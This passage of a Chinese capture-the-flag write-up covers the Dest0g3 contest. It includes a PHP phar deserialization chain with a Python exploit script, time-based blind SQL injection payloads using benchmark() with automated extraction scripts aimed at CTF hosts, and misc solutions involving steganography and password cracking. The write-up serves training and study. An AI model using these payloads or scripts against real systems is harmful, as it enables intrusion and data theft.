class=\"string\">&quot;SplFileObject&quot;</span>;</span><br><span class=\"line\"><span class=\"comment\">#$tree2-&gt;act = &quot;FilesystemIterator&quot;;</span></span><br><span class=\"line\"><span class=\"variable\">$tree</span>-&gt;name-&gt;xxx-&gt;p = <span class=\"variable\">$tree2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize(<span class=\"variable\">$tree</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"keyword\">new</span> Phar(<span class=\"string\">&#x27;test.phar&#x27;</span>,<span class=\"number\">0</span>,<span class=\"string\">&#x27;test.phar&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;startBuffering();</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;setStub(<span class=\"string\">&#x27;__HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;setMetadata(<span class=\"variable\">$tree</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;addFromString(<span class=\"string\">&#x27;text.txt&#x27;</span>,<span class=\"string\">&#x27;test&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;stopBuffering();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>生成</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">O:4:&quot;Tree&quot;:2:&#123;s:4:&quot;name&quot;;O:5:&quot;Apple&quot;:2:&#123;s:3:&quot;xxx&quot;;O:3:&quot;Air&quot;:1:&#123;s:1:&quot;p&quot;;O:4:&quot;Tree&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;act&quot;;s:13:&quot;SplFileObject&quot;;&#125;&#125;s:4:&quot;flag&quot;;s:5:&quot;&#x2F;flag&quot;;&#125;s:3:&quot;act&quot;;N;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>修改phar文件，<strong>将最后 } 去掉来 fast-destruct 绕过 throw new Error(“start”);</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Dest0g3/image-20220523222949494.png\"></p>\n<p>写个exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> gzip</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> sha1</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://ab7c96c7-93b8-4971-86d6-ddcf9d48bbb8.node4.buuoj.cn:81&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 修改签名</span></span><br><span class=\"line\">file = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;test.phar&quot;</span>,<span class=\"string\">&quot;rb&quot;</span>).read()</span><br><span class=\"line\">text = file[:-<span class=\"number\">28</span>]  <span class=\"comment\">#读取开始到末尾除签名外内容</span></span><br><span class=\"line\">last = file[-<span class=\"number\">8</span>:]   <span class=\"comment\">#读取最后8位的GBMB和签名flag</span></span><br><span class=\"line\">new_file = text+sha1(text).digest() + last  <span class=\"comment\">#生成新的文件内容，主要是此时Sha1正确了。</span></span><br><span class=\"line\"><span class=\"built_in\">open</span>(<span class=\"string\">&quot;test2.phar&quot;</span>,<span class=\"string\">&quot;wb&quot;</span>).write(new_file)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">file = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;test2.phar&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>) <span class=\"comment\">#打开文件</span></span><br><span class=\"line\">file_out = gzip.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;phar.zip&quot;</span>, <span class=\"string\">&quot;wb+&quot;</span>)<span class=\"comment\">#创建压缩文件对象</span></span><br><span class=\"line\">file_out.writelines(file)</span><br><span class=\"line\">file_out.close()</span><br><span class=\"line\">file.close()</span><br><span class=\"line\"></span><br><span class=\"line\">step = <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> step == <span class=\"number\">0</span>:</span><br><span class=\"line\">    res = requests.post(</span><br><span class=\"line\">        url,</span><br><span class=\"line\">        data=&#123;</span><br><span class=\"line\">            <span class=\"number\">0</span>: <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./phar.zip&#x27;</span>, <span class=\"string\">&#x27;rb&#x27;</span>).read(),</span><br><span class=\"line\">            <span class=\"number\">1</span>:<span class=\"string\">&#x27;O:1:&quot;D&quot;:1:&#123;s:5:&quot;start&quot;;s:1:&quot;w&quot;;&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ) <span class=\"comment\">#写入文件</span></span><br><span class=\"line\"><span class=\"keyword\">elif</span> step == <span class=\"number\">1</span>:</span><br><span class=\"line\">    res = requests.post(</span><br><span class=\"line\">        url,</span><br><span class=\"line\">        </span><br><span class=\"line\">        data=&#123;</span><br><span class=\"line\">            <span class=\"number\">0</span>: <span class=\"string\">&#x27;phar:///tmp/21bea9838c09f57aa29b99da24fba404.jpg&#x27;</span>,</span><br><span class=\"line\">            <span class=\"number\">1</span>: <span class=\"string\">&#x27;O:1:&quot;D&quot;:1:&#123;s:5:&quot;start&quot;;s:1:&quot;r&quot;;&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ) <span class=\"comment\"># 触发</span></span><br><span class=\"line\"></span><br><span class=\"line\">print(res.text)</span><br></pre></td></tr></table></figure>\n\n<p>flag在/fflaggg</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Dest0g3/image-20220523223307954.png\" alt=\"image-20220523223307954\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Dest0g3/image-20220523224717434.png\" alt=\"image-20220523224717434\"></p>\n<p>FLAG：Dest0g3{bea1b75c-67fa-4c82-8f6f-2703d16e218e}</p>\n<h2 id=\"Really-Easy-SQL\"><a href=\"#Really-Easy-SQL\" class=\"headerlink\" title=\"Really Easy SQL\"></a>Really Easy SQL</h2><ul>\n<li>延时注入 benchmark</li>\n</ul>\n<p>不管输入什么页面都回显一个信息有误，可以考虑延时注入，网站标题写的是钓鱼站，所以后台可能语句为insert</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Dest0g3/image-20220525083020330.png\" alt=\"image-20220525083020330\"></p>\n<p>然后进行前后闭合测试，过滤sleep，substr，空格等</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">insert into user values(119,&#39;test&#39;,if(2&gt;1,benchmark(20000000,md5(1)),2)),(&#39;test&#39;,&#39;1&#39;,&#39;1&#39;)</span><br></pre></td></tr></table></figure>\n\n<p>payload，延时2.0s左右</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">test&#39;,if(2&gt;1,benchmark(2000000,md5(1)),2)),(&#39;test2</span><br><span class=\"line\">test&#39;,if(ascii(mid(database(),1,1))&gt;97,benchmark(2000000,md5(1)),2)),(&#39;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Dest0g3/image-20220525085041375.png\" alt=\"image-20220525085041375\"></p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">from</span> string <span class=\"keyword\">import</span> ascii_uppercase,ascii_lowercase,digits</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://f2b0d8e1-e12f-446c-a90e-bc79e2c0a062.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#payload = &quot;test&#x27;,if(ascii(mid(database(),&#123;&#125;,1))&lt;=&#123;&#125;,benchmark(1000000,md5(1)),2)),(&#x27;&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#payload = &quot;test&#x27;,if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&lt;=&#123;&#125;,benchmark(1000000,md5(1)),2)),(&#x27;&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#payload = &quot;test&#x27;,if(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flaggg&#x27;)),&#123;&#125;,1))&lt;=&#123;&#125;,benchmark(1000000,md5(1)),2)),(&#x27;&quot;</span></span><br><span class=\"line\">payload = <span class=\"string\">&quot;test&#x27;,if(ascii(mid((select(cmd)from(flaggg)),&#123;&#125;,1))=&#123;&#125;,benchmark(500000,md5(1)),2)),(&#x27;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># database: ctf</span></span><br><span class=\"line\"><span class=\"comment\"># tables: flaggg</span></span><br><span class=\"line\"><span class=\"comment\"># columns: cmd</span></span><br><span class=\"line\"></span><br><span class=\"line\">flagstr = ascii_lowercase+digits+<span class=\"string\">&#x27;&#123;&#125;-&#x27;</span></span><br><span class=\"line\">flag = <span class=\"string\">&quot;Dest0g3&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>,<span class=\"number\">60</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> flagstr:</span><br><span class=\"line\">        data = &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;username&quot;</span>: payload.<span class=\"built_in\">format</span>(i, <span class=\"built_in\">ord</span>(j)),</span><br><span class=\"line\">            <span class=\"string\">&quot;password&quot;</span>: <span class=\"string\">&quot;1&quot;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            res = requests.post(url, data=data, timeout=<span class=\"number\">0.3</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            flag += j</span><br><span class=\"line\">            print(flag)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.2</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.2</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://f2b0d8e1-e12f-446c-a90e-bc79e2c0a062.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class=\"line\">asc = <span class=\"string\">&#x27;Dabcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;-_&#x27;</span></span><br><span class=\"line\">flag = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">50</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> asc:</span><br><span class=\"line\">        <span class=\"comment\">#payload = &quot;&#x27;or(if(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flaggg&#x27;)),&#123;&#125;,1))=&#123;&#125;,benchmark(1000000,md5(1)),0))or&#x27;&quot;</span></span><br><span class=\"line\">        payload = <span class=\"string\">&quot;&#x27;or(if(ascii(mid((select(cmd)from(flaggg)),&#123;&#125;,1))=&#123;&#125;,benchmark(2000000,md5(1)),0))or&#x27;&quot;</span></span><br><span class=\"line\">        data = &#123;<span class=\"string\">&quot;username&quot;</span>: payload.<span class=\"built_in\">format</span>(i, <span class=\"built_in\">ord</span>(j)),<span class=\"string\">&quot;password&quot;</span>: <span class=\"string\">&quot;test&quot;</span>&#125;</span><br><span class=\"line\">        start_time2=time.time()</span><br><span class=\"line\">        res = requests.post(url, data=data)</span><br><span class=\"line\">        end_time2=time.time()</span><br><span class=\"line\">        sec2=(end_time2-start_time2)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> sec2 &gt;=<span class=\"number\">0.4</span></span><br><span class=\"line\">            flag += j</span><br><span class=\"line\">            print(flag)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.3</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n\n<p>FLAG：Dest0g3{a6d4b63f-97a4-458e-b3cb-693cb2e5555b}</p>\n<p>文章：<a href=\"https://www.redteaming.top/2019/06/26/mysql%E4%B8%AD%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E7%9A%845%E7%A7%8D%E5%A7%BF%E5%8A%BF/#benchmark\">MySQL中延时注入的5种姿势</a></p>\n<h2 id=\"easysql\"><a href=\"#easysql\" class=\"headerlink\" title=\"easysql\"></a>easysql</h2><p>If大写绕过</p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">from</span> string <span class=\"keyword\">import</span> ascii_uppercase,ascii_lowercase,digits</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://260d2f5f-8f3a-4c00-ba22-abd633608164.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#payload = &quot;test&#x27;,if(ascii(mid(database(),&#123;&#125;,1))&lt;=&#123;&#125;,benchmark(1000000,md5(1)),2)),(&#x27;&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#payload = &quot;test&#x27;,if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&lt;=&#123;&#125;,benchmark(1000000,md5(1)),2)),(&#x27;&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#payload = &quot;test&#x27;,if(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flaggg&#x27;)),&#123;&#125;,1))&lt;=&#123;&#125;,benchmark(1000000,md5(1)),2)),(&#x27;&quot;</span></span><br><span class=\"line\">payload = <span class=\"string\">&quot;test&#x27;,If(ascii(mid((select(cmd)from(flaggg)),&#123;&#125;,1))=&#123;&#125;,benchmark(500000,md5(1)),2)),(&#x27;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># database: ctf</span></span><br><span class=\"line\"><span class=\"comment\"># tables: flaggg,user</span></span><br><span class=\"line\"><span class=\"comment\"># columns: cmd</span></span><br><span class=\"line\"></span><br><span class=\"line\">flagstr = ascii_lowercase+digits+<span class=\"string\">&#x27;&#123;&#125;-&#x27;</span></span><br><span class=\"line\">flag = <span class=\"string\">&quot;Dest0g3&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>,<span class=\"number\">60</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> flagstr:</span><br><span class=\"line\">        data = &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;username&quot;</span>: payload.<span class=\"built_in\">format</span>(i, <span class=\"built_in\">ord</span>(j)),</span><br><span class=\"line\">            <span class=\"string\">&quot;password&quot;</span>: <span class=\"string\">&quot;1&quot;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            res = requests.post(url, data=data, timeout=<span class=\"number\">0.3</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            flag += j</span><br><span class=\"line\">            print(flag)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.2</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            time.sleep(<span class=\"number\">0.2</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br></pre></td></tr></table></figure>\n\n<p>FLAG：Dest0g3{4c96be81-539b-458d-89b3-9abfa84e032e}</p>\n<h2 id=\"ljctr\"><a href=\"#ljctr\" class=\"headerlink\" title=\"ljctr\"></a>ljctr</h2><p>一道java的题目，给了两个jar包,DemoApplication.jar和waf.jar</p>\n<p>附件中的txt给了关键字agent，前一段时间java内存马的学习了解过agent内存马的姿势，所以猜测这道题可能需要内存马相关知识，但是更为具体的原理并不清楚，所以尽量在解题的时候学习agent</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Dest0g3/image-20220525174552640.png\" alt=\"image-20220525174552640\"></p>\n<p>demo为springboot</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker rm -f ljctr</span><br><span class=\"line\">docker build --tag&#x3D;ljctr .</span><br><span class=\"line\">docker run -p 8080:8080 --rm --name&#x3D;ljctr ljctr</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220527082458437.png\" alt=\"image-20220527082458437\"></p>\n<p>出题人wp：<a href=\"https://firebasky.github.io/2022/06/04/ljctr-wp/\">ljctr wp (firebasky.github.io)</a></p>\n<h1 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h1><h2 id=\"Welcome-to-fxxking-DestCTF\"><a href=\"#Welcome-to-fxxking-DestCTF\" class=\"headerlink\" title=\"Welcome to fxxking DestCTF\"></a>Welcome to fxxking DestCTF</h2><p>公众号回复即可</p>\n<h2 id=\"Pngenius\"><a href=\"#Pngenius\" class=\"headerlink\" title=\"Pngenius\"></a>Pngenius</h2><p>发现压缩包，提取后</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526202947900.png\" alt=\"image-20220526202947900\"></p>\n<p>steg发现password：Weak_Pas5w0rd</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526203916780.png\" alt=\"image-20220526203916780\"></p>\n<p>FLAG：Dest0g3{2908C1AA-B2C1-B8E6-89D1-21B97D778603}</p>\n<h2 id=\"EasyEncode\"><a href=\"#EasyEncode\" class=\"headerlink\" title=\"EasyEncode\"></a>EasyEncode</h2><p>压缩包爆破密码：100861</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526205752278.png\" alt=\"image-20220526205752278\"></p>\n<p>摩斯密码-&gt;hex转str-&gt;unicode-&gt;urldecode-&gt;bae64</p>\n<p>FLAG：Dest0g3{Deoding_1s_e4sy_4_U}</p>\n<h2 id=\"你知道js吗\"><a href=\"#你知道js吗\" class=\"headerlink\" title=\"你知道js吗\"></a>你知道js吗</h2><p>修改后缀为 .docx，发现字体不对，修改字体</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526204347670.png\" alt=\"image-20220526204347670\"></p>\n<p>base64解码，发现xml格式，urldecode</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;yes&quot;?&gt;</span><br><span class=\"line\">&lt;assembly xmlns&#x3D;&quot;urn:schemas-microsoft-com:asm.v1&quot; manifestVersion&#x3D;&quot;1.0&quot;&gt;</span><br><span class=\"line\">&lt;trustInfo xmlns&#x3D;&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt;</span><br><span class=\"line\">            &lt;requestedExecutionLevel level&#x3D;&quot;asInvoker&quot; uiAccess&#x3D;&quot;false&quot;&#x2F;&gt;</span><br><span class=\"line\">&lt;application xmlns&#x3D;&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt;</span><br><span class=\"line\">        &lt;dpiAwareness xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;SMI&#x2F;2016&#x2F;WindowsSettings&quot;&gt;Do you know js&lt;&#x2F;dpiAwareness&gt;</span><br><span class=\"line\">&lt;script language&#x3D;&quot;javascript&quot;&gt;document.write(unescape(&#39;&lt;html&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;Do You Know js&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;HTA:APPLICATION</span><br><span class=\"line\">  APPLICATIONNAME&#x3D;&quot;Do You Know js&quot;</span><br><span class=\"line\">  ID&#x3D;&quot;Inception&quot;</span><br><span class=\"line\">  VERSION&#x3D;&quot;1.0&quot;</span><br><span class=\"line\">  SCROLL&#x3D;&quot;no&quot;&#x2F;&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\">    &lt;div id&#x3D;&quot;feature&quot;&gt;</span><br><span class=\"line\">            &lt;div id&#x3D;&quot;content</span><br><span class=\"line\">\t\t\t\t&lt;&#x2F;style&gt;</span><br><span class=\"line\">                &lt;h1 id&#x3D;&quot;unavailable&quot; class&#x3D;&quot;loading&quot;&gt;Building js.....&lt;&#x2F;h1&gt;</span><br><span class=\"line\">\t\t\t\t&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; language&#x3D;&quot;javascript&quot;&gt;</span><br><span class=\"line\">\t\t\t\t\tfunction RunFile() &#123;</span><br><span class=\"line\">          var WshShell &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;);</span><br><span class=\"line\">\t\t\t\t\tWshShell.Run(&quot;notepad %windir%&#x2F;Desktop&#x2F;js.txt&quot;, 1, false);</span><br><span class=\"line\">          &#x2F;* var oExec &#x3D; WshShell.Exec(&quot;notepad&quot;); *&#x2F;</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&lt;&#x2F;script&gt;</span><br><span class=\"line\">        &lt;&#x2F;div&gt;</span><br><span class=\"line\">    &lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">\t&lt;input type&#x3D;&quot;button&quot; value&#x3D;&quot;Implant Inception Here&quot; onclick&#x3D;&quot;RunFile();&quot;&#x2F;&gt;</span><br><span class=\"line\">\t&lt;p style&#x3D;&quot;color:white;&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">+++++ ++[-&gt; +++++ ++&lt;]&gt; +++.. ++.-. ++.-- --.++ ++.-- </span><br><span class=\"line\">-.-.- --.++ ++++.</span><br><span class=\"line\">+.--- -..++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++.&lt; +++[- </span><br><span class=\"line\">&gt;---&lt; ]&gt;--- ---.+ ++++. -----</span><br><span class=\"line\">.+++. ...-- ---.+ ++++. ---.+ ++.-- ---.+ ++++. ---.. +++++ +.--- ----.</span><br><span class=\"line\">&lt;++++ [-&gt;++ ++&lt;]&gt; ++.&lt;+ +++[- &gt;---- &lt;]&gt;-. ---.+</span><br><span class=\"line\"> +++++ .---- -.++. ++.+.</span><br><span class=\"line\">--.-- .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.&lt; ++++[ -&gt;--- -&lt;]&gt;- </span><br><span class=\"line\">.+.-. ---.+ ++.+. -.+++</span><br><span class=\"line\">+.--- --.&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. ----. +.+++ +.---</span><br><span class=\"line\">-.--- .+++. -..&lt;+ +++[- &gt;++++ &lt;]&gt;++ </span><br><span class=\"line\">.&lt;+++ +[-&gt;- ---&lt;] &gt;-.++ +++.- ----.</span><br><span class=\"line\">+++.. ---.+ ++.-- --.+. ..+++ +.-.- ----. +++++ </span><br><span class=\"line\">.---- .+.++ ++.-- --.++</span><br><span class=\"line\">++.-. ----. +.-.+ ++++. </span><br><span class=\"line\">&lt;+++[ -&gt;+++ &lt;]&gt;++ ++.&lt;</span><br><span class=\"line\">&lt;&#x2F;p&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">  &lt;&#x2F;html&gt;</span><br><span class=\"line\">&#39;));&lt;&#x2F;script&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>发现 brainfuck</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526204934733.png\" alt=\"image-20220526204934733\"></p>\n<p>hex转str</p>\n<p>FLAG：Dest0g3{86facac9-0a5d-4047-b702-86cb37ab77b2}</p>\n<h2 id=\"StrangeTraffic\"><a href=\"#StrangeTraffic\" class=\"headerlink\" title=\"StrangeTraffic\"></a>StrangeTraffic</h2><p>发现modbus协议，过滤一下</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220527113618950.png\" alt=\"image-20220527113618950\"></p>\n<p>追踪tcp，发现首字母不同的最后一行，提取出来</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220527115300360.png\" alt=\"image-20220527115300360\"></p>\n<p>RGVzdDBnM3szMUE1QkVBNi1GMjBELUYxOEEtRThFQS0yOUI0RjI1NzEwOEJ9</p>\n<p>FLAG：Dest0g3{31A5BEA6-F20D-F18A-E8EA-29B4F257108B}</p>\n<h2 id=\"4096\"><a href=\"#4096\" class=\"headerlink\" title=\"4096\"></a>4096</h2><p>全局js文件搜索flag</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526213742816.png\" alt=\"image-20220526213742816\"></p>\n<p>base64得到部分flag：4ee7-b673-971d81f8b177}</p>\n<p>发现这里引入了一个png，弄下来</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526214222839.png\" alt=\"image-20220526214222839\"></p>\n<p>分离出来wav 和zip</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526214540426.png\" alt=\"image-20220526214540426\"></p>\n<p>wav分两段，前一段为手机信号，dtmf2num 得到 74958097831</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526234531098.png\" alt=\"image-20220526234531098\"></p>\n<p>使用SSTV扫一下得到信息，电话号码，md5刚才的倒序的数字</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526233330171.png\" alt=\"image-20220526233330171\"></p>\n<p>压缩包密码：32fc1b5487cb447f792a19418b92544e</p>\n<p>然后gaps拼图完事</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220527001538522.png\" alt=\"image-20220527001538522\"></p>\n<p>base64：RGVzdDBnM3tlZDRkMTE0Zi05ZWU0LQ==</p>\n<p>FLAG：Dest0g3{ed4d114f-9ee4-4ee7-b673-971d81f8b177}</p>\n<h2 id=\"EasyWord\"><a href=\"#EasyWord\" class=\"headerlink\" title=\"EasyWord\"></a>EasyWord</h2><p>得到hint，爆破word，密码为：ulqsbt</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526211238845.png\" alt=\"image-20220526211238845\"></p>\n<p>找到类似题目：<a href=\"https://blog.csdn.net/shidonghang/article/details/102656486\">https://blog.csdn.net/shidonghang/article/details/102656486</a></p>\n<p>发现编辑宏也需要密码</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526211952286.png\" alt=\"image-20220526211952286\"></p>\n<p>拖出bin文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526212110770.png\" alt=\"image-20220526212110770\"></p>\n<p>修改为DPX，然后替换到zip中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526212143324.png\" alt=\"image-20220526212143324\"></p>\n<p>然后出错，最后搜索到一篇文章，<a href=\"http://nicethemes.cn/news/txtlist_i72545v.html\">破解docm宏密码，破解.rar密码，解开flag.rar的口令，获得解压缩文件中的Flag (nicethemes.cn)</a></p>\n<p>密码竟然对了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">2zhlmcl,1hblsqt.</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ljctr/image-20220526212844354.png\" alt=\"image-20220526212844354\"></p>\n<p>FLAG：Dest0g3{VBScr1pt_And_Hashc4t_1s_g00d}</p>\n<h2 id=\"Python-jail\"><a href=\"#Python-jail\" class=\"headerlink\" 